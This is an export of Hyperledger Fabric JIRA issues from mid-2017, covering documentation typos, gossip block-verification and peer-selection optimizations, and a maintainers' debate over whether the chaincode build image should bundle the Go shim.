Could you provide more detail or debug logs.  Thanks.;;;","06/Jul/17 1:06 AM;Ratnakar;Tried with both *_e2e_cli_* sample and node-sdk based *_balance-transfer_* sample and unable to recreate the issue;;;","06/Jul/17 10:18 PM;yacovm; 

I can't reproduce this.

I used [https://github.com/yacovm/fabricDeployment] and modified it to reproduce the steps above and the bug didn't manifest:

 

!Capture.PNG!;;;","07/Jul/17 10:45 PM;muralisr;[~csftan] will close this as we can't recreate the issue (and based on the error, clearly the old ledger being there will preven the join from succeeding).  Do reopen if you like with the information (logs, docker compose file etc).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Typo in ""Gerrit Recommended Practices""",FAB-5160,18933,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,nemoto,nemoto,nemoto,04/Jul/17 5:46 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:29 AM,v1.0.0-rc1,,,Future,,fabric-docs,,,,,,0,,,,,,,"I think there is an unnecessary string "":abbr:"" in ""Gerrit Recommended Practices""
{noformat}
The topic will show up in the review :abbr:UI and in the Open Changes List. Topic branches will disappear from the master tree when its content is merged.{noformat}
 [http://hyperledger-fabric.readthedocs.io/en/latest/Gerrit/best-practices.html]",,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6sv:",,,,,,,,,,,,,,,,,,,,,,,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Optimize peer selection of channel batches in gossip,FAB-5161,18940,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,yacovm,yacovm,04/Jul/17 7:11 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,05/Jul/17 4:40 AM,v1.0.0-rc1,,,v1.0.0,,fabric-gossip,,,,,,1,,,,,,,"In gossip whenever a batch of channel-scoped messages (either leadership, blocks, stateInfo, etc.) is sent to remote peers, a function goes over all existing alive peers and then selects from them a subset of peers. 
This is done in *gossipInChan* function:
{code}
		// Select the peers to send the messages to
		// For leadership messages we will select all peers that pass routing factory - e.g. all peers in channel and org
		membership := g.disc.GetMembership()
		allPeersInCh := filter.SelectPeers(len(membership), membership, chanRoutingFactory(gc))
		peers2Send := filter.SelectPeers(g.conf.PropagatePeerNum, membership, chanRoutingFactory(gc))
		// Send the messages to the remote peers
		for _, msg := range messagesOfChannel {
			if msg.IsLeadershipMsg() {
				g.comm.Send(msg, allPeersInCh...)
			} else {
				g.comm.Send(msg, peers2Send...)
			}
}
{code}

In case of leadership messages, the subset is taken from the entire membership set without *an upper bound* (we gossip leadership messages to all peers in the channel), and in case of non-leadership messages the subset is taken with *an upper bound* equal to the propogation fanout (configurable).

Finding peers that are eligible to receive any channel-related data involves cryptographical computations and is non-negligible (measured ~ 25ms in a network of 8 peers)

The 2 possibilities (leadership and non-leadership) are calculated even though each method invocation of *gossipInChan* receives only 1 type of message.
Therefore, it would be beneficial performance wise to just calculate the option that is relevant to that method invocation and not calculate both options each time.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6t3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Jul/17 4:41 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/11351/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Document endorser, peer, orderer",FAB-5163,18944,24754,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,nasht00,nasht00,04/Jul/17 10:31 PM,26/Aug/19 6:07 PM,28/Oct/23 3:00 AM,26/Aug/19 6:07 PM,,,,,,fabric-docs,,,,,,0,,,,,,,"I am going through the documentation in order, and very often the words ""peer"", ""orderer"" and ""endorser"" appear.

However, those were never defined. They don't ever appear in the ""Key Concepts"" section, and then start appearing without context later in the documentation. 

With time, I am starting to understand their meaning (I think?) however it would be a lot easier if those were explained in the key concept section, as they seem like important keywords!",,nasht00,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzwu67:",,,,,,,,,,,,,,,,,,,,,,,nasht00,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contradiction in documentation,FAB-5164,18945,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,nasht00,nasht00,04/Jul/17 10:45 PM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:06 PM,,,,,,fabric-docs,,,,,,0,,,,,,,"In [http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4noah.html]

""State created by a chaincode is scoped exclusively to that chaincode and can’t be accessed directly by another chaincode""

In [http://hyperledger-fabric.readthedocs.io/en/latest/arch-deep-dive.html]

""In principle, any chaincode can read the keys belonging to other chaincodes""",,nasht00,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx0bj:",,,,,,,,,,,,,,,,,,,,,,,nasht00,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Avoid the redundant block verifications in gossip,FAB-5165,18946,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,04/Jul/17 10:56 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Jul/17 12:10 AM,v1.0.0-rc1,,,v1.0.0,,fabric-gossip,,,,,,5,,,,,,,"In gossip, when block messages are gossiped among peers the signature of the ordering service on them is validated.

This causes a message to be validated in several places:
# When it is received from the ordering service
# When it is received from a peer via forwarding or pull
Since the block is forwarded among peer several times, this has an amplifying effect.
# When it is received from a peer via state tranfer

Empirical performance tests I have conducted show that for blocks of 100KB, the time spent on verifying a block is between 700 micro-seconds to 2milliseconds.

When testing a benchmark scenario of 1000 blocks with a single leader disseminating to 7 non-leader peers, with propagation factor of 4, a block entry rate (to the leader peer) of bursts of 20 blocks every 100ms, the gossip network is over committed and starting from block 500 - most blocks were dropped because the gossip internal buffers were full (we drop blocks in order for the network not to be ""deadlocked"").

However - when I did the following bypass in [channel.go|https://github.com/hyperledger/fabric/blob/master/gossip/gossip/channel/channel.go#L547-L565] :

{code}
func (gc *gossipChannel) verifyBlock(msg *proto.GossipMessage, sender common.PKIidType) bool {
	if gc.GetConf().SkipBlockVerification {
		return true
	}
{code}

*No block was dropped because of comm layer buffer overflow!*

-Therefore I suggest we use the skipBlockVerification configuration property (not used in the code but exists in the [core.yaml|https://github.com/hyperledger/fabric/blob/master/sampleconfig/core.yaml#L157]) in order to give the user (the network administrator) a chance to increase throughput on the expense of byzantine tolerance, while preserving correctness and validity (the blocks are in any case validated before they enter the ledger and when they are pulled from the ordering service)-



*UPDATE*

I realized the reason for the performance penalty is that we have an inefficient order of steps at block handling:
*Background*: The flow of blocks from the comm layer to the state transfer layer (the last stop in the gossip layer before the block is passed to the committer service of the peer) works as follows:
Communication layer -->  gossip module routes to the right channel object ---> channel module checks if the block was received for the first time  ---> published to the state transfer layer ---> block is put in a data structure that ensures blocks are passed in-order to the committer

There are actually 2 inefficiencies that exist in the code and when they are improved I get the same (good) results as above without blocks being dropped:
# Blocks are verified when they arrive from the communication layer in [gossip_impl.go|https://github.com/hyperledger/fabric/blob/master/gossip/gossip/gossip_impl.go#L440-L457] but are in any case verified (again) in the [channel module|https://github.com/hyperledger/fabric/blob/master/gossip/gossip/channel/channel.go#L547-L565] which handles everything related to channels.
# When the block reaches the channel module it is *first verified* and then checked if it has been received before (this is done by adding it to the message store and seeing if the message store rejected the message or not). 
From random nature of the forwarding phase in gossip, each message might be received a few times and this causes redundant verification of messages. 

I pushed the following commit https://gerrit.hyperledger.org/r/#/c/11377/ to take care of this. 
This commit ensures that a message is verified only after it is decided that it can be added to the message store or not. 
",,binhn,JonathanLevi,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6tj:",,,,,,,,,,,,,,,,,,,,,,,binhn,JonathanLevi,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jul/17 1:07 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/11377/;;;","05/Jul/17 4:03 AM;mastersingh24;This seems like a good thing to do for sure and there seems to be minimal (if any) risk.;;;","05/Jul/17 4:38 PM;yacovm;[~mastersingh24] I updated the JIRA and uploaded a new CR which I prefer that would be merged instead;;;","05/Jul/17 11:20 PM;yacovm;I am changing this to a bug since under a sudden intensive burst of blocks - the blocks are not going to reach the peers via gossip but only at a much later time, with state transfer and if the leader peer is not available it would mean the block is lost until the leader is resurrected.

 

Hence I think it can be seen as a bug.;;;","05/Jul/17 11:23 PM;JonathanLevi;[~yacovm] let me help. We should rephrase: ""Optimize block verification in gossip"" ;;;","05/Jul/17 11:52 PM;binhn;Even though this is a medium bug, but it has a large implication on the timeliness and correctness of the ledger during burst traffic or high volume network. The CR shows minimum and clear changes to reduce the potential congestion in processing block messages.;;;","05/Jul/17 11:55 PM;yacovm;[~JonathanLevi] we need 5 votes, right?
could you please remove your -2 from the change set? :);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docs do not meet branding guidelines,FAB-5166,18947,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,04/Jul/17 11:44 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Jul/17 8:32 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"According to Hyperledger brand guidelines, we should reference Hyperledger Fabric as Hyperledger Fabric and not fabric, Fabric, or anything else.

There are a number of reference which need to be corrected. ",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6tr:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jul/17 11:53 PM;mastersingh24;https://gerrit.hyperledger.org/r/11355;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Typo in test/feature/README.rst,FAB-5175,18956,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,nemoto,nemoto,nemoto,05/Jul/17 9:26 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 9:13 PM,v1.0.0-rc1,,,Future,,fabric-docs,,,,,,0,,,,,,,"There are typos in test/feature/README.md.
“docker networks” should be “docker network”",,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6vb:",,,,,,,,,,,,,,,,,,,,,,,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
peer/ccenv should not include the shim,FAB-5177,18958,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,greg.haskins,greg.haskins,05/Jul/17 11:44 AM,06/Sep/19 6:08 AM,28/Oct/23 3:00 AM,31/Aug/19 8:59 PM,v1.0.0-rc1,,,v2.0.0,,fabric-peer,,,,,,1,hygiene,ipm,ipm-planned,,,,"In the past, we made the decision to include the shim both as a convenience to our users (to avoid explicit vendoring) and as a space optimization (why have every chaincode include the same shim lib over and over?).

Fast forward to now: go dependency management leaves much to be desired.  Having the ccenv include the shim can be problematic w.r.t. fragility between the included shim and the chaincode application.  For example, try to write an application which uses the timestamp features of the shim and you will receive errors due to conflicts between the fabric vendored version of the protobuf library and the chaincode application.

Now that we have auto-vendoring, the convenience factor for including the shim is gone.  It only leaves the space optimization consideration.  Considering how fragile go dependency management is, we may want to go the conservative route and simply remove all dependencies from the ccenv and make ""peer package"" / ""chaintool package"" provide them via the auto-vendor feature.

 

If we are going to do this, we should do it before v1.0 is cut so that chaincode apps for 1.0 are properly formed in a non-breaking way going forward.",,atakada,binhn,daijianw,denyeart,fbenhamo,greg.haskins,JonathanLevi,lmars,mastersingh24,MichaelWang,muralisr,nemoto,pd93,ScottAllan,sheehan,shimos,sstone1,troyronda,weeds,,,,,,,,,,,,,,,,,,,,,FAB-15732,FAB-15782,FAB-16310,,,,,,,,,,,,,,,,,,,,,FAB-12246,,,,FABN-1375,,,,,,,,,,,,"09/Jul/17 11:30 PM;greg.haskins;abi-contracts.png;https://jira.hyperledger.org/secure/attachment/11614/abi-contracts.png",,,,,,,,,,,,,,,,,Unset,,,FAB-15337,,,,,,,,,"1|i00n2c:r6",,,,Unset,,,,,,,3.0,Unset,,,,,,,,,,,atakada,binhn,daijianw,denyeart,fbenhamo,greg.haskins,JonathanLevi,lmars,mastersingh24,MichaelWang,muralisr,nemoto,pd93,ScottAllan,sheehan,shimos,sstone1,troyronda,weeds,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,mergify/bp/release-2.2/pr-4374,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,main,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,release-2.5,release-2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jul/17 8:07 PM;sstone1;Couple of comments from me:

1) is there any impact to existing applications installing chaincode using the Node.js SDK? Is this auto-vendoring feature (which seems to have snuck in at some point recently) enabled for both the Node.js SDK and the peer CLI?

2) assuming the answer to 1) is no impact, then I don't object to it but it seems a big change to sneak into the 1.0 final release, so are you considering cutting an 1.0 rc2 to iron out any problems that may arise from this change?;;;","06/Jul/17 6:50 AM;fbenhamo;Actually, including shim in fabric-ccenv also enables another optimization (in addition to space optimization): pre-compilation of the hyperledger libraries: https://jira.hyperledger.org/browse/FAB-4947

On the other side, we had issues with the fact that GRPC is vendored inside github.com/hyperledger/fabric, as it prevents a chaincode to use GRPC (it is not possible to load twice the GRPC package: once from github.com/hyperledger/fabric/vendor and once from the chaincode vendor directory: [https://github.com/grpc/grpc-go/issues/566]).
 One solution might to be ""unvendor"" all the denpendencies of github.com/hyperledger/fabric, in fabric-ccenv. For our application, we've actually added the following line to the Dockerfile of fabric-ccenv:
{code:java}
RUN cp -R $GOPATH/src/github.com/hyperledger/fabric/vendor/* $GOPATH/src && rm -rf $GOPATH/src/github.com/hyperledger/fabric/vendor{code};;;","06/Jul/17 7:13 AM;greg.haskins;[~sstone1] Auto-vendoring did not just sneak in.  It was introduced as CR 6991 ([https://gerrit.hyperledger.org/r/#/c/6991)] in early March and was merged in early June, making it probably one of the most long running and presumably heavily considered proposals Fabric has had to date.

Auto-vendoring feature is not yet ported to NodeSDK.  I am also of the opinion that it should not be.  Rather, we should strive for single-tool workflows (e.g. peer-package and chaintool package) that the SDKs may consume rather than having them re-invent the logic in each SDK.

As far as impact, if the SDKs are structured to consume the ""peer package"" output already, then really the only impact is to drive workflows away from the native SDK package flows.  Chaintool-package is already supported in node-sdk.

As far as impact, code impact is minimal.  UX impact is larger.  However that isn't the point.  The point is the current code might very well be broken/fragile.  So the question is: fix it now while we technically can, or risk having to fix it later (after v1.0 GA) when ABI breakage is much more serious/ill-advised.  So while I appreciate the notion of being conservative here, we can't evaluate the risk in a vacuum.  There is risk to _not_ doing something now too, and I would argue that my current analysis is that the risk is greater to leave it the way it is.

And to be clear, I am not the one rushing the RC/GA out the door.  I am fine with letting things bake a little longer (e.g. -rc2, etc).  I just dont want us to find that the ABI we shipped in v1.0 GA is broken, so I am raising this now (better late than never).;;;","06/Jul/17 7:17 AM;greg.haskins;I should also add: auto-vendoring isn't the problem.  The problem is that trying to provide some of the dependencies in ccenv is fragile, at least w.r.t. the interfaces that the shim surfaces to the chaincode app (e.g. timestamp).  You would hit this problem, for instance, even if the application manual vendors its own deps (rather than using the auto-vendoring);;;","06/Jul/17 7:31 AM;greg.haskins;[~fbenhamo] I am not sure the compile-time optimization is worth fragility, even if it were substantial in reducing compilation time.  That said, we would also need to quantify exactly what kind of speed up it offers to even begin to evaluate whether it's worth it.  If that is what was done as part of FAB-4947, I'll take a look, but generally speaking, ""fast and broken"" is in no one's best interest other than benchmarkers ;)

Regarding exploding vendored deps: This was actually my first approach when I first devised CR 6991 as a solution to the previous ""pack the entire GOPATH"" that we used to do.  It ended poorly.  Turns out, exploding the deps causes even more conflict than retaining per-package vendoring (which is how it works today).  So, I suspect that idea is a non-starter, but someone is welcome to revisit things.

Regarding GRPC problem: I understand what you are saying here, but I would also point out that a chaincode that is trying to GRPC is probably broken to begin with (non-determinism etc).  We are currently permissive enough in the container that this could technically work, but its a bad idea IMO and should probably be locked down eventually.

In the end, I still think the most conservative thing to do is to simply stop playing games with optimizing the ccenv.  Just declare that the app must include all of its deps, and adjust the packagers (peer-package, chaintool-package) to help.  We can get fancy for v2.0 when we sort out how to manage godeps better.;;;","06/Jul/17 8:48 AM;sstone1;[~greg.haskins] I think this is what you're suggesting the install process looks like for applications using the Node.js SDK with these changes:

Option 1) the application must itself vendor both the Fabric shim and all required dependencies, before the application can use the Node.js SDK to submit an install request to the peer (by sending a directory of Go chaincode).

Option 2) the application must use the ""peer package"" command to vendor both the Fabric shim and all required dependencies, before it can use the Node.js SDK to submit an install request to the peer (by sending the packaged chaincode).

Am I right in my understanding?

Does the vendored Fabric shim need to match up with the exact version of the Fabric peer that it is being installed on? Would you support a v1.0 vendored shim being deployed to a v1.1 peer? If not, that is a problem being put back onto the application as per Fabric v0.6 for both option 1) and 2), where the application has to know which version of Fabric it is deploying to and vendor the right version - which was nicely solved by having the chaincode base image preinstalled with the right version.;;;","06/Jul/17 10:59 AM;greg.haskins;[~sstone1] Regarding option (1):  I would state it as follows:

Before this proposed change, the application today must vendor all of its dependencies _except_ the shim.

After this proposed change, the application must vendor all of its dependencies _including_ the shim.

Option 2 is the same both before and after this proposed change.

Regarding version matching question:  It's important to point out that this proposal is actually drastically _improving_ the ABI compatibility scenario you are asking about. 

I say this because we would be moving from relying on a golang interface (the shim and peripheral deps like timestamp) as our ABI and moving it to a protobuf/grpc managed abstraction (the TLS+GRPC connection to the peer).  It should be noted that protobuf/grpcs are designed explicitly to support forwards/backwards ABI management.  Golang interfaces (as are most languages an API would be built with) are decidedly not structured this way and would require explicit management by us, the maintainers to monitor/control changes.

Consider, for example, a new field added to a structure exposed via the shim in a hypothetical v1.1 release.  If you code your chaincode to the v1.1 shim and then deploy it to a peer network that still contains ccenv v1.0, blamo, it wont compile.  Contrast that to a GRPC model where we add a new field to the chaincode/peer .proto in v1.1.  Applications that were compiled against v1.0 (regardless of which side we are talking about) will safely ignore the extra field in the wire protocol.  Applications that were compiled with v1.1 will see the default value for the field when communicating with a v1.0 counterparty, etc.

So to answer your question directly, not only would this proposal ""support a v1.0 vendored shim being deployed to a v1.1 peer"", it would be really hard/error-prone to support this _without_ this proposal.;;;","06/Jul/17 11:09 AM;greg.haskins;[~mastersingh24] In addition to the conflicts you are researching with the timestamp interface, it should be noted that things like BCCSP seem to suffer from a similar fate as GRPC noted above by [~fbenhamo].  This could have implications for chaincode applications that need to do crypto operations like signature verifications, etc.  It is these potential conflicts that concern me the most, because I think doing real crypto will be one of the first things people do once the underlying platform is stabilized and we move beyond toy applications.;;;","06/Jul/17 6:46 PM;mastersingh24;I think it it too late in the game to make this change.  There are so many tests across the various components (especially the SDKs) which don't vendor the shim at this point.

I'd suggest that we fix FAB-4883 ( [https://gerrit.hyperledger.org/r/#/c/10967/] is a start) and either modify the current CR or create another where we modify the package / install command to actually not filter out shim and protos/peer.

We should also update the documentation to *strongly* recommend that people vendor *all* chaincode dependencies.;;;","06/Jul/17 8:38 PM;greg.haskins;""Too late"" is not relevant if the system is broken.  Broken would include the inability to use things like the timestamp or crypto features.  Here's what i suggest.

1) confirm these are indeed broken by adding a chaincode UT that uses them.
2) assuming they are broken, see if stuffing a vendored shim into the package solves the problem despite the dep being available in the ccenv.
3) if yes, we solve this issue by leaving ccenv as is, removing the ""provided"" filter in the packager, updating the doc as @Gari suggested, call it a day.
4) if no, regroup and discuss alternate strategies.;;;","06/Jul/17 9:27 PM;weeds;Gari Singh posted this in rocket chat- so I wanted to add this as comment in JIRA:  As far as I can tell, the only package we seem to have an issue with is `{{github.com/golang/protobuf/ptypes/timestamp}}`
To be clear, what I am doing is actually ""vendoring"" all other dependencies within my chaincode package
(that is - I'm not using the `{{peer chaincode package}}` to handle my dependencies for me)
In order to explicitly import and use `{{github.com/golang/protobuf/ptypes/timestamp}}`, I'm force to vendor `{{github.com/hyperledger/fabric/core/chaincode/shim}}` as well as `{{github.com/golang/protobuf/ptypes/timestamp}}

 

{{Greg Haskins then responded with the following: As an experiment could you remove the ""provided"" filter from the packager and see if that vendors the shim in a similar way? }};;;","06/Jul/17 11:22 PM;greg.haskins;@Gari another consideration here is also the point I made above w.r.t. ABI.  I think we are in a much stronger position for managing this by requiring that the apps bundle the shim and using protobufs to manage the variance.  Thoughts?

On a slight tangent to all this, we should probably start to bundle .s files in addition to .go/.c/.h. I think there is a JIRA for this already;;;","07/Jul/17 1:34 AM;mastersingh24;On the ABI front, yeah  - make sense.  That's the main reason I wanted to document a recommendation to vendor the shim;;;","07/Jul/17 10:03 PM;mastersingh24;It's going to be hard to add a unit test for actually vendoring the shim, but Murali and I did a bunch of tests and were able to handle all cases with the current ccenv;;;","07/Jul/17 10:05 PM;JonathanLevi;Looked closely into these (including the exchanges with Murali on the maintainers channel, etc.)
I believe we should lower the priority of this ticket, and am not sure whether we should make such a change at this point.

[~mastersingh24], [~muralisr], [~greg.haskins]: Are we OK with documenting the recommendation to vendor the shim? Do we want to put this up for a vote? Please advise.;;;","07/Jul/17 10:06 PM;greg.haskins;[~mastersingh24] I was just thinking that the test has to invoke the packager logic and install/instantiate the deployment payload.  Am I missing something?  I thought we do this already.

Anyway, w.r.t. to your findings, please provide details.;;;","07/Jul/17 10:16 PM;greg.haskins;[~JonathanLevi] I would suggest to approach this not from ""should we make this change now?"" to

1) Is there a problem?  E.g. can we deploy chaincode that uses things like timestamp or any of the relevant crypto features if it intersects with the stuff that was already preloaded within ccenv

2) If (1) == no, drop issue and move on.  

3) If (1) == yes, can it be fixed by simply ignoring the stuff pre-loaded in the ccenv and using a vendoring technique (both doc and packager changes).

4) If (3) == yes, does promoting an ABI that both includes and discourages the use of the pre-included shim make sense?

5) If (4) or (3) == no, decide to fix before release or take chances with release as is.

IOW: I think we need to stop thinking of it as ""how risky is the change"" and instead think of it as ""is this required or not"".  Because if it's required and we cut v1.0....that's bad.;;;","07/Jul/17 10:34 PM;mastersingh24;[~greg.haskins]  100% agree - that's why I went through all the trouble of making sure that we can meet all potential chaincode use cases with what we have today.  As far as I could could tell - which included testing any of the key functions we expose in chaincode today - there were no issues we could not solve.  Also tested that we can indeed vendor the shim with no issues.

Govendor does a very nice job of flattening vendored dependencies which is what makes most of this work.;;;","07/Jul/17 11:28 PM;binhn;I am summarizing the chat on #fabric-maintainers so that we can document this issue.

[~greg.haskins] It looks like the result is 1 = yes; 3 = yes; 4 = yes (IMO see below)

The result of testing so far, including many other packages in ccenv such as BCCSP, proto, msp, etc, the only time we run into problem is with Timestamp, and only in a specific usage as following:

{{   var ts *timestamp.Timestamp}}
{{   ts, _ = stub.GetTxTimestamp()}}

The explicit declaration of variable of Timestamp would require vendoring the chaincode shim to avoid conflict.

But the above code can easily be replaced with implicit declaration to avoid vendoring the chaincode shim:

{{   ts, _ := stub.GetTxTimestamp()}}

 This is the reason I think 4=yes, and we can document this.;;;","08/Jul/17 1:20 AM;greg.haskins;[~binhn] thank you to all for doing the legwork on quantifying the scope of the problem and solutions.  

I get that you are voting to leave the shim in the ccenv.  It's not clear if you are advocating that we solve the problem simply by documenting how to use the timestamp interface properly, or if we advocate that we vendor the shim with chaincode (by updating the doc/packager).  Please clarify.

An additional point to consider is that we also need to make a decision regarding the question of ABI compatibility management.  I am less concerned here for chaintool-based flows, since chaintool/CAR already has the notion of a platform type/version that I can use to manage changes in the shim/ccenv going forward.  For vanilla golang chaincode, however, we still need to consider the ramifications for scenarios such as shim:v1.1 based chaincode being deployed to a peer:v1.0 fabric network.

I still think the more reasonable way to handle this may be to have the chaincode vendor the shim and use protobufs to manage the differences.  

Assuming there is agreement on this, the questions then becomes ""what is the value of leaving the shim in the ccenv"".

Pros:
 # Existing tests that assume the shim is included continue to work
 # Existing user applications that rely on the included shim will continue to work

Cons:
 # If we advise against relying on the included shim but provide it anyway, it could be confusing.
 # Apps that work today may not work tomorrow as the fabric network (and ccenv that goes with it) change past v1.0
 # We should put some ABI management processes in place (CI, etc) to ensure this remains compatible going forward (or at least alerts us when it isn't).

Thoughts?

 ;;;","08/Jul/17 7:01 AM;binhn;[~greg.haskins]
{quote}I get that you are voting to leave the shim in the ccenv.  It's not clear if you are advocating that we solve the problem simply by documenting how to use the timestamp interface properly, or if we advocate that we vendor the shim with chaincode (by updating the doc/packager).  Please clarify.
{quote}
Yes, I am advocating to doc the issue with Timestamp and recommend the preferred method (implicit declaration) to avoid vendoring the chaincode shim. 

 

 ;;;","09/Jul/17 9:33 PM;greg.haskins;[~binhn]

{quote}Yes, I am advocating to doc the issue with Timestamp and recommend the preferred method (implicit declaration) to avoid vendoring the chaincode shim.
{quote}

Ok.  What are your thoughts on the ABI comments however?  I still argue that relying on the shim in the ccenv is a weaker, more fragile model.  How would we plan to manage/monitor this interface for compliance?
;;;","09/Jul/17 10:56 PM;muralisr;[~greg.haskins] I think having the shim provided for in the golang package has a couple of advantages
* every user does not have to include the shim (mainly, convenience and  usability)
* by having the fabric would provide shim, we preventing users from mixing an incompatible shim

One thing we *could* do is make it more compatible with car and javaenv (and other future platforms) by removing the shim from ccenv and putting it into a golang image. ie, replace 


{code:java}
   builder: $(DOCKER_NS)/fabric-ccenv:$(ARCH)-$(PROJECT_VERSION)

    golang:
        # golang has shim in golangenv
        runtime: $(BASE_DOCKER_NS)/fabric-golangenv:$(ARCH)-$(BASE_VERSION)

    car:
        # car may need more facilities (JVM, etc) in the future as the catalog
        # of platforms are expanded.  For now, we can just use baseos
        runtime: $(BASE_DOCKER_NS)/fabric-baseos:$(ARCH)-$(BASE_VERSION)

    java:
        # This is an image based on java:openjdk-8 with addition compiler
        # tools added for java shim layer packaging.
        # This image is packed with shim layer libraries that are necessary
        # for Java chaincode runtime.
        Dockerfile:  |
            from $(DOCKER_NS)/fabric-javaenv:$(ARCH)-$(PROJECT_VERSION)

{code}

Currently it looks like this

{code:java}
...
    golang:
        # golang will never need more than baseos
        runtime: $(BASE_DOCKER_NS)/fabric-baseos:$(ARCH)-$(BASE_VERSION)
...
{code}

Given this change is not a removal of shim but more a rearrangement consistent with other platforms, I'd vote for doing it post 1.0 (if agreed to of course).

